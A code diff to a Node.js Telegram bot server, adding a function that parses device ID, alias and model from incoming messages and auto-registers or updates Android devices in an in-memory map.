@@ -193,11 +193,50 @@ setInterval(async () => {
   }
 }, 5 * 60 * 1000);
 
+function extractAndAutoRegisterDevice(text) {
+  if (!text) return;
+
+  const idMatch = text.match(/🆔\s*\*?ID:\*?\s*`?([a-zA-Z0-9_-]+)`?/i);
+  if (!idMatch) return;
+
+  const devId = idMatch[1].trim();
+
+  const aliasMatch = text.match(/📱\s*\*?Device:\*?\s*`?([^`\n]+)`?/i);
+  const devAlias = aliasMatch ? aliasMatch[1].trim() : 'Android Device';
+
+  const modelMatch = text.match(/📲\s*\*?Model:\*?\s*`?([^`\n]+)`?/i);
+  const devModel = modelMatch ? modelMatch[1].trim() : devAlias;
+
+  if (!devices.has(devId)) {
+    devices.set(devId, {
+      deviceId: devId,
+      deviceAlias: devAlias,
+      model: devModel,
+      batteryLevel: 100,
+      isCharging: false,
+      isServiceRunning: true,
+      isForwardingEnabled: true,
+      killReason: 'Auto-registered via Telegram notification',
+      lastSeen: new Date()
+    });
+    console.log(`[Auto-Registered via Telegram Message] ID: ${devId} | Alias: ${devAlias}`);
+  } else {
+    const dev = devices.get(devId);
+    dev.lastSeen = new Date();
+    dev.deviceAlias = devAlias;
+    dev.model = devModel;
+    devices.set(devId, dev);
+  }
+}
+
 // Telegram Message Handler
 bot.on('message', async (msg) => {
   const chatId = String(msg.chat.id);
   const chatType = msg.chat.type;
   const text = (msg.text || '').trim();
+
+  // Extract & Auto-register device if message contains device details
+  extractAndAutoRegisterDevice(text);
 
   if (chatType === 'group' || chatType === 'supergroup' || chatType === 'channel') {
     if (text.startsWith('/') || text.toLowerCase().includes('groupid') || text.toLowerCase().includes('id')) {
